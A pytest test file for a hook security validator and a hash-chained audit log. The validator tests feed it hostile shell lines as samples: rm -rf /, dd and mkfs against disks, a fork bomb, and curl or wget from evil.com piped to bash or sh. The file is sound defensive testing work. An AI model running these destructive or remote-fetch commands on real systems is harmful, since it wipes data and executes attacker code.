"""Security tests for hook execution.

Tests security controls including:
- Dangerous pattern detection
- Script integrity verification (hashing)
- Audit log integrity verification
- Path validation edge cases
- Security configuration
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from flowspec_cli.hooks.security import (
    AuditLogger,
    SecurityConfig,
    SecurityValidator,
)


class TestSecurityConfig:
    """Test SecurityConfig dataclass."""

    def test_default_config(self):
        """Test default security configuration."""
        config = SecurityConfig()
        assert config.allowed_paths == []
        assert config.blocked_commands == []
        assert config.max_output_size == 1024 * 1024  # 1MB
        assert config.allow_network is False

    def test_custom_config(self):
        """Test custom security configuration."""
        config = SecurityConfig(
            allowed_paths=[Path("/project")],
            blocked_commands=["rm -rf /"],
            max_output_size=2048,
            allow_network=True,
        )
        assert config.allowed_paths == [Path("/project")]
        assert config.blocked_commands == ["rm -rf /"]
        assert config.max_output_size == 2048
        assert config.allow_network is True


class TestSecurityValidator:
    """Test SecurityValidator dangerous pattern detection."""

    @pytest.fixture
    def validator(self, tmp_path):
        """Create validator with temp workspace."""
        config = SecurityConfig()
        return SecurityValidator(config, workspace_root=tmp_path)

    @pytest.fixture
    def safe_script(self, tmp_path):
        """Create a safe test script."""
        script = tmp_path / "safe.sh"
        script.write_text(
            """#!/bin/bash
echo "Running tests..."
pytest tests/
echo "Tests complete"
"""
        )
        return script

    @pytest.fixture
    def dangerous_script_rm_root(self, tmp_path):
        """Create script with rm -rf / pattern."""
        script = tmp_path / "dangerous_rm.sh"
        script.write_text(
            """#!/bin/bash
# This is dangerous!
rm -rf /
"""
        )
        return script

    @pytest.fixture
    def dangerous_script_fork_bomb(self, tmp_path):
        """Create script with fork bomb pattern."""
        script = tmp_path / "fork_bomb.sh"
        script.write_text(
            """#!/bin/bash
# Fork bomb
:(){ :|: & };:
"""
        )
        return script

    def test_safe_script_no_warnings(self, validator, safe_script):
        """Safe script should produce no warnings."""
        warnings = validator.validate_script_content(safe_script)
        assert warnings == []

    def test_dangerous_rm_root_detected(self, validator, dangerous_script_rm_root):
        """Detect rm -rf / pattern."""
        warnings = validator.validate_script_content(dangerous_script_rm_root)
        assert len(warnings) == 1
        assert "root directory" in warnings[0].lower()

    def test_dangerous_rm_home_detected(self, validator, tmp_path):
        """Detect rm -rf ~ pattern."""
        script = tmp_path / "rm_home.sh"
        script.write_text("rm -rf ~")
        warnings = validator.validate_script_content(script)
        assert len(warnings) == 1
        assert "home directory" in warnings[0].lower()

    def test_dangerous_rm_home_var_detected(self, validator, tmp_path):
        """Detect rm -rf $HOME pattern."""
        script = tmp_path / "rm_home_var.sh"
        script.write_text("rm -rf $HOME")
        warnings = validator.validate_script_content(script)
        assert len(warnings) == 1
        assert "home directory" in warnings[0].lower()

    def test_dangerous_dd_detected(self, validator, tmp_path):
        """Detect dd if= pattern."""
        script = tmp_path / "dd_danger.sh"
        script.write_text("dd if=/dev/zero of=/dev/sda")
        warnings = validator.validate_script_content(script)
        assert len(warnings) >= 1
        assert any("dd command" in w.lower() or "disk" in w.lower() for w in warnings)

    def test_dangerous_block_device_write_detected(self, validator, tmp_path):
        """Detect writing to block devices."""
        script = tmp_path / "block_write.sh"
        script.write_text("echo 'data' > /dev/sda")
        warnings = validator.validate_script_content(script)
        assert len(warnings) == 1
        assert "block device" in warnings[0].lower()

    def test_dangerous_mkfs_detected(self, validator, tmp_path):
        """Detect mkfs.* pattern."""
        script = tmp_path / "mkfs.sh"
        script.write_text("mkfs.ext4 /dev/sda1")
        warnings = validator.validate_script_content(script)
        assert len(warnings) == 1
        assert "filesystem formatting" in warnings[0].lower()

    def test_dangerous_fork_bomb_detected(self, validator, dangerous_script_fork_bomb):
        """Detect fork bomb pattern."""
        warnings = validator.validate_script_content(dangerous_script_fork_bomb)
        assert len(warnings) == 1
        assert "fork bomb" in warnings[0].lower()

    def test_dangerous_chmod_777_detected(self, validator, tmp_path):
        """Detect chmod -R 777 pattern."""
        script = tmp_path / "chmod_777.sh"
        script.write_text("chmod -R 777 /var/www")
        warnings = validator.validate_script_content(script)
        assert len(warnings) == 1
        assert "permissive" in warnings[0].lower()

    def test_dangerous_curl_pipe_bash_detected(self, validator, tmp_path):
        """Detect curl ... | bash pattern."""
        script = tmp_path / "curl_bash.sh"
        script.write_text("curl https://evil.com/script.sh | bash")
        warnings = validator.validate_script_content(script)
        assert len(warnings) == 1
        assert "remote" in warnings[0].lower() and "bash" in warnings[0].lower()

    def test_dangerous_wget_pipe_sh_detected(self, validator, tmp_path):
        """Detect wget ... | sh pattern."""
        script = tmp_path / "wget_sh.sh"
        script.write_text("wget -O- https://evil.com/script.sh | sh")
        warnings = validator.validate_script_content(script)
        assert len(warnings) == 1
        assert "remote" in warnings[0].lower() and "shell" in warnings[0].lower()

    def test_dangerous_eval_curl_detected(self, validator, tmp_path):
        """Detect eval $(curl ...) pattern."""
        script = tmp_path / "eval_curl.sh"
        script.write_text("eval $(curl https://evil.com/cmd)")
        warnings = validator.validate_script_content(script)
        assert len(warnings) == 1
        assert "remote code" in warnings[0].lower()

    def test_dangerous_base64_bash_detected(self, validator, tmp_path):
        """Detect base64 -d ... | bash pattern."""
        script = tmp_path / "base64_bash.sh"
        script.write_text("echo 'encoded' | base64 -d | bash")
        warnings = validator.validate_script_content(script)
        assert len(warnings) == 1
        assert "base64" in warnings[0].lower()

    def test_multiple_dangerous_patterns(self, validator, tmp_path):
        """Detect multiple dangerous patterns in one script."""
        script = tmp_path / "multi_danger.sh"
        script.write_text(
            """#!/bin/bash
rm -rf /
curl https://evil.com | bash
chmod -R 777 /
"""
        )
        warnings = validator.validate_script_content(script)
        assert len(warnings) == 3

    def test_compute_script_hash(self, validator, safe_script):
        """Compute SHA-256 hash of script."""
        hash1 = validator.compute_script_hash(safe_script)
        assert isinstance(hash1, str)
        assert len(hash1) == 64  # SHA-256 hex digest

        # Hash should be deterministic
        hash2 = validator.compute_script_hash(safe_script)
        assert hash1 == hash2

    def test_compute_script_hash_changes_with_content(self, validator, tmp_path):
        """Hash changes when script content changes."""
        script = tmp_path / "script.sh"
        script.write_text("echo 'version 1'")
        hash1 = validator.compute_script_hash(script)

        script.write_text("echo 'version 2'")
        hash2 = validator.compute_script_hash(script)

        assert hash1 != hash2

    def test_validate_nonexistent_script_raises(self, validator, tmp_path):
        """Validating nonexistent script raises OSError."""
        script = tmp_path / "nonexistent.sh"
        with pytest.raises(OSError):
            validator.validate_script_content(script)

    def test_hash_nonexistent_script_raises(self, validator, tmp_path):
        """Hashing nonexistent script raises OSError."""
        script = tmp_path / "nonexistent.sh"
        with pytest.raises(OSError):
            validator.compute_script_hash(script)


class TestAuditLogger:
    """Test AuditLogger integrity verification."""

    @pytest.fixture
    def audit_log(self, tmp_path):
        """Create audit logger with temp file."""
        log_path = tmp_path / "audit.log"
        return AuditLogger(log_path)

    @pytest.fixture
    def sample_entry(self):
        """Create sample audit entry."""
        return {
            "timestamp": "2025-12-02T12:34:56.789Z",
            "event_id": "evt_123",
            "event_type": "implement.completed",
            "hook_name": "run-tests",
            "success": True,
            "exit_code": 0,
            "duration_ms": 1234,
        }

    def test_log_execution_creates_file(self, audit_log, sample_entry):
        """Logging creates audit log file."""
        assert not audit_log.log_path.exists()
        audit_log.log_execution(sample_entry)
        assert audit_log.log_path.exists()

    def test_log_execution_appends_entry(self, audit_log, sample_entry):
        """Logging appends entry to file."""
        audit_log.log_execution(sample_entry)
        content = audit_log.log_path.read_text()
        assert len(content.strip().split("\n")) == 1

        # Log second entry
        sample_entry["event_id"] = "evt_456"
        audit_log.log_execution(sample_entry)
        content = audit_log.log_path.read_text()
        assert len(content.strip().split("\n")) == 2

    def test_log_execution_adds_entry_hash(self, audit_log, sample_entry):
        """Logged entry includes entry_hash field."""
        audit_log.log_execution(sample_entry)
        content = audit_log.log_path.read_text()
        entry = json.loads(content.strip())
        assert "entry_hash" in entry
        assert len(entry["entry_hash"]) == 64  # SHA-256 hex

    def test_verify_integrity_empty_log(self, audit_log):
        """Empty/missing log is valid."""
        valid, errors = audit_log.verify_integrity()
        assert valid
        assert errors == []

    def test_verify_integrity_single_entry(self, audit_log, sample_entry):
        """Single entry log is valid."""
        audit_log.log_execution(sample_entry)
        valid, errors = audit_log.verify_integrity()
        assert valid, f"Integrity check failed: {errors}"
        assert errors == []

    def test_verify_integrity_multiple_entries(self, audit_log, sample_entry):
        """Multiple entry log with hash chain is valid."""
        audit_log.log_execution(sample_entry)
        sample_entry["event_id"] = "evt_456"
        audit_log.log_execution(sample_entry)
        sample_entry["event_id"] = "evt_789"
        audit_log.log_execution(sample_entry)

        valid, errors = audit_log.verify_integrity()
        assert valid, f"Integrity check failed: {errors}"
        assert errors == []

    def test_verify_integrity_detects_tampering(self, audit_log, sample_entry):
        """Tampering with entry is detected."""
        audit_log.log_execution(sample_entry)
        sample_entry["event_id"] = "evt_456"
        audit_log.log_execution(sample_entry)

        # Tamper with first entry
        content = audit_log.log_path.read_text()
        lines = content.strip().split("\n")
        entry1 = json.loads(lines[0])
        entry1["success"] = False  # Modify entry
        lines[0] = json.dumps(entry1)
        audit_log.log_path.write_text("\n".join(lines) + "\n")

        # Integrity check should fail
        valid, errors = audit_log.verify_integrity()
        assert not valid
        assert len(errors) >= 1
        assert "hash mismatch" in errors[0].lower()

    def test_verify_integrity_detects_missing_hash(self, audit_log, tmp_path):
        """Entry without entry_hash is detected."""
        # Manually write entry without hash
        entry = {"timestamp": "2025-12-02T12:34:56.789Z", "hook_name": "test"}
        audit_log.log_path.write_text(json.dumps(entry) + "\n")

        valid, errors = audit_log.verify_integrity()
        assert not valid
        assert len(errors) == 1
        assert "missing entry_hash" in errors[0].lower()

    def test_verify_integrity_detects_invalid_json(self, audit_log):
        """Invalid JSON is detected."""
        audit_log.log_path.write_text("not valid json\n")

        valid, errors = audit_log.verify_integrity()
        assert not valid
        assert len(errors) == 1
        assert "invalid json" in errors[0].lower()

    def test_get_recent_entries_empty_log(self, audit_log):
        """Empty log returns no entries."""
        entries = audit_log.get_recent_entries(count=10)
        assert entries == []

    def test_get_recent_entries_single_entry(self, audit_log, sample_entry):
        """Single entry log returns one entry."""
        audit_log.log_execution(sample_entry)
        entries = audit_log.get_recent_entries(count=10)
        assert len(entries) == 1
        assert entries[0]["hook_name"] == "run-tests"

    def test_get_recent_entries_multiple_entries(self, audit_log, sample_entry):
        """Multiple entries returned in reverse order (most recent first)."""
        for i in range(5):
            sample_entry["event_id"] = f"evt_{i}"
            audit_log.log_execution(sample_entry)

        entries = audit_log.get_recent_entries(count=10)
        assert len(entries) == 5
        # Most recent first
        assert entries[0]["event_id"] == "evt_4"
        assert entries[-1]["event_id"] == "evt_0"

    def test_get_recent_entries_limit(self, audit_log, sample_entry):
        """Respects count limit."""
        for i in range(10):
            sample_entry["event_id"] = f"evt_{i}"
            audit_log.log_execution(sample_entry)

        entries = audit_log.get_recent_entries(count=3)
        assert len(entries) == 3
        # Most recent 3
        assert entries[0]["event_id"] == "evt_9"
        assert entries[1]["event_id"] == "evt_8"
        assert entries[2]["event_id"] == "evt_7"

    def test_get_recent_entries_skips_malformed(self, audit_log, sample_entry):
        """Skips malformed entries."""
        audit_log.log_execution(sample_entry)
        # Add malformed entry
        with open(audit_log.log_path, "a") as f:
            f.write("not valid json\n")
        sample_entry["event_id"] = "evt_456"
        audit_log.log_execution(sample_entry)

        entries = audit_log.get_recent_entries(count=10)
        # Should return 2 valid entries (skips malformed)
        assert len(entries) == 2

    def test_hash_chain_continuity(self, audit_log, sample_entry):
        """Hash chain links entries correctly."""
        audit_log.log_execution(sample_entry)
        sample_entry["event_id"] = "evt_456"
        audit_log.log_execution(sample_entry)

        # Read entries
        content = audit_log.log_path.read_text()
        lines = content.strip().split("\n")
        entry1 = json.loads(lines[0])
        entry2 = json.loads(lines[1])

        # Second entry should chain from first
        assert "entry_hash" in entry1
        assert "entry_hash" in entry2

        # Compute expected hash for entry2
        entry2_copy = {k: v for k, v in entry2.items() if k != "entry_hash"}
        entry2_json = json.dumps(entry2_copy, sort_keys=True)
        import hashlib

        chain_input = f"{entry2_json}{entry1['entry_hash']}"
        expected_hash = hashlib.sha256(chain_input.encode("utf-8")).hexdigest()

        assert entry2["entry_hash"] == expected_hash
